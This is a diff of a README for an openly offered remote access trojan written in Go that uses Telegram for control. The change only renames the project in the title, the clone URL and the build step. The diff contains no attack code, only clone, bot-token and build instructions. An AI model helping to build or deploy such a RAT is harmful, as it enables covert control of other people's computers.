@@ -1,6 +1,6 @@
-# teleGoRAT
+# tele-go-rat
 
-**teleGoRAT** is a straightforward, cross-platform RAT written in Go. It leverages Telegram for communication.
+**tele-go-rat** is a straightforward, cross-platform RAT written in Go. It leverages Telegram for communication.
 
 ## Features
 
@@ -21,7 +21,7 @@
 1. Clone this repository:
 
 ```shell
-git clone https://github.com/efthimisgrk/teleGoRAT.git
+git clone https://github.com/efthimisgrk/tele-go-rat.git
 ```
 
 2. Create a Telegram bot and get your API token. You can follow the official Telegram documentation to create a bot: [Creating a new bot](https://core.telegram.org/bots#botfather).
@@ -33,7 +33,7 @@ git clone https://github.com/efthimisgrk/teleGoRAT.git
 5. Build the teleGoRAT binary:
 
 ```shell
-cd teleGoRAT
+cd tele-go-rat
 go build
 ```
 
